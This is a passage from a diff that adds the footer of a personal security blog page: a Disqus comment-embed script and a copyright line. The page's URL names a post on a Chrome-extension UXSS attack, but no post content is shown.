+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+    </div>
+  <!-- </div> -->
+    <footer id="footer">
+    <div class="foot-warp">
+      <p>© 2014 Nearg1e</p>
+    </div>
+  </footer>
+  <script src="/js/tools.js"></script>
+  
+  
+  <script>
+    var disqus_shortname = 'neargle';
+    
+    var disqus_url = 'https://blog.neargle.com/2018/02/14/hacking-chrome-extensions-chapter-one-a-uxss/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  
+  
+</body>
+</html>
